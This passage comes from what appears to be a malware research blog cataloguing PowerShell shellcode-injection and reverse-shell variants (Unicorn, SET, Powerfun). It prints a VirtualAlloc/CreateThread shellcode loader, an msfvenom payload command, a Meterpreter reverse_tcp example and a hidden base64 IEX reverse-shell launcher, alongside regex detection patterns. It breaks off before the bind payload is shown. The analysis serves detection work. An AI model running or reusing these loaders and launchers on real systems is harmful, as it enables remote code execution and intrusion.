class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">g</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">z</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">x</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-o">::</span><span class="crayon-e">VirtualAlloc</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0x1000</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">g</span><span class="crayon-sy">,</span><span class="crayon-cn">0x40</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">le</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">z</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-o">++</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-o">::</span><span class="crayon-e">memset</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">IntPtr</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">x</span><span class="crayon-sy">.</span><span class="crayon-e">ToInt32</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">z</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-v">i</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-o">::</span><span class="crayon-e">CreateThread</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">x</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">;</span><span class="crayon-sy">;</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-i">sleep</span><span class="crayon-h"> </span><span class="crayon-cn">60</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0012 seconds] -->
<p>While the Cerber downloader accounted for a large sum of the EncodedCommand found in Microsoft Word documents, these four variants use the same technique accounting for almost the entirety launched from EXE files.</p>
<p>The gist of the code is that they import functions from DLL’s in the following order:</p>
<ul>
<li>“kernel32.dll” VirtualAlloc</li>
<li>“kernel32.dll” CreateThread</li>
<li>“msvcrt.dll” memset</li>
</ul>
<p>Then they load their shellcode into an array of bytes using the “0x” hex representation. Next, they call VirtualAlloc to allocate, at minimum, a 4,096 byte page of RWX memory, copy the byte-array to memory with memset, and finally transfer execution to the shellcode with CreateThread.</p>
<p>Out of the 1,971 samples, there were 1,211 unique shellcode payloads, indicating that over 50% of them were re-used in other attacks. Most of these tools utilize Metasploit to generate the shellcode and if they don’t accept specifying a payload, generally opted for reverse Meterpreter shells. For example, the below line is from the Magic Unicorn’s code showing how to specify the MSF payload.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c977032698679" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
print("PS Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443")</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c977032698679-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c977032698679-1"><span class="crayon-e">print</span><span class="crayon-sy">(</span><span class="crayon-s">"PS Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443"</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>The underlying code for the generation of the payload, including platform, architecture, and encoding:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c978252288912" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
"msfvenom -p %s %s %s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" % (
            payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c978252288912-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c978252288912-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c978252288912-1"><span class="crayon-s">"msfvenom -p %s %s %s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c"</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c978252288912-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">payload</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">ipaddr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">port</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">stdout</span><span class="crayon-o">=</span><span class="crayon-v">subprocess</span><span class="crayon-sy">.</span><span class="crayon-v">PIPE</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">stderr</span><span class="crayon-o">=</span><span class="crayon-v">subprocess</span><span class="crayon-sy">.</span><span class="crayon-v">PIPE</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">shell</span><span class="crayon-o">=</span><span class="crayon-t">True</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>Another interesting observation is that if you look at the shellcode length, the top 2 lengths were 294 and 312 bytes long, with 846 and 544 samples respectively; afterwards the sample counts fall off sharply.</p>
<table width="100%">
<tbody>
<tr>
<td><strong>Shellcode Length (Bytes)</strong></td>
<td width="38"><strong>Count</strong></td>
</tr>
<tr>
<td>294</td>
<td width="38">846</td>
</tr>
<tr>
<td>312</td>
<td width="38">544</td>
</tr>
<tr>
<td>337</td>
<td width="38">145</td>
</tr>
<tr>
<td>303</td>
<td width="38">131</td>
</tr>
<tr>
<td>285</td>
<td width="38">46</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>What makes this interesting is the sheer volume of identical lengths signals to me that they are likely generating the same payload with the same tools and using something without much possible variation in length, such as a 4-byte IP compared to a variable length URL as the C2.</p>
<p>As this blog serves to catalog the differences between these variants, below are regex queries to identify the specific variant.</p>
<p>Shellcode Inject</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c97a863573723" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
"^(\$c = |\$1 = [\"\']\$c = )"
"\$g = 0x1000" 
"\$z\.Length \-gt 0x1000"
"\$z\[\$i\]"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c97a863573723-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c97a863573723-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c97a863573723-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c97a863573723-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c97a863573723-1"><span class="crayon-s">"^(\$c = |\$1 = [\"\']\$c = )"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c97a863573723-2"><span class="crayon-s">"\$g = 0x1000"</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-60a9b96a2c97a863573723-3"><span class="crayon-s">"\$z\.Length \-gt 0x1000"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c97a863573723-4"><span class="crayon-s">"\$z\[\$i\]"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>Unicorn</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c97c603175769" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
"\$w \= Add\-Type \-memberDefinition \$[a-zA-Z0-9]{3,4} \-Name"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c97c603175769-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c97c603175769-1"><span class="crayon-s">"\$w \= Add\-Type \-memberDefinition \$[a-zA-Z0-9]{3,4} \-Name"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>SET</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c97e026408399" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
"\$code \= [\']{1,2}\[DllImport"
"\$sc\.Length -gt 0x1000\)"
"\$winFunc::memset"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c97e026408399-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c97e026408399-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c97e026408399-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c97e026408399-1"><span class="crayon-s">"\$code \= [\']{1,2}\[DllImport"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c97e026408399-2"><span class="crayon-s">"\$sc\.Length -gt 0x1000\)"</span></div><div class="crayon-line" id="crayon-60a9b96a2c97e026408399-3"><span class="crayon-s">"\$winFunc::memset"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>Unicorn Modified</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c97f868499044" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
"^\$[a-zA-Z0-9]{5,7} \= \'\[DllImport.+Start\-sleep 60\}\;"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c97f868499044-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c97f868499044-1"><span class="crayon-s">"^\$[a-zA-Z0-9]{5,7} \= \'\[DllImport.+Start\-sleep 60\}\;"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>Powerfun Reverse (100 Samples – 2.44% Coverage),</strong></p>
<p><strong>Powerfun Bind (2 Samples – 0.05% Coverage)</strong></p>
<p>Another variation to code execution was found inside Powerfun, more specifically they use Metasploit’s “windows/powershell_reverse_tcp” and “powershell_bind_tcp” payloads to create interactive shells with the target system. The reverse payload is encoded with base64 and launched via a background process using System.Diagnostics.Process.</p>
<p>Reverse payload –</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c980516532541" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAFHL6FcCA71W6nlhxGUKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c980516532541-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c980516532541-1"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">IntPtr</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Size</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">b</span><span class="crayon-o">=</span><span class="crayon-s">'powershell.exe'</span><span class="crayon-sy">}</span><span class="crayon-st">else</span><span class="crayon-sy">{</span><span class="crayon-sy">$</span><span class="crayon-v">b</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">env</span><span class="crayon-o">:</span><span class="crayon-v">windir</span><span class="crayon-o">+</span><span class="crayon-s">'\syswow64\WindowsPowerShell\v1.0\powershell.exe'</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-o">=</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Diagnostics</span><span class="crayon-sy">.</span><span class="crayon-v">ProcessStartInfo</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">FileName</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">b</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">Arguments</span><span class="crayon-o">=</span><span class="crayon-s">'-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('</span><span class="crayon-s">'H4sIAFHL6FcCA71W6nlhxGUKAAA='</span><span class="crayon-s">'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">UseShellExecute</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-t">false</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">RedirectStandardOutput</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-t">true</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">WindowStyle</span><span class="crayon-o">=</span><span class="crayon-s">'Hidden'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">CreateNoWindow</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-t">true</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">p</span><span class="crayon-o">=</span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Diagnostics</span><span class="crayon-sy">.</span><span class="crayon-v">Process</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">Start</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p>The bind payload sets up a TCP listener by listening with System.Net.Sockets.TCPClient and passing received PowerShell script to Invoke-Expression.</p>
<p>Bind payload –</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c981632191770" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
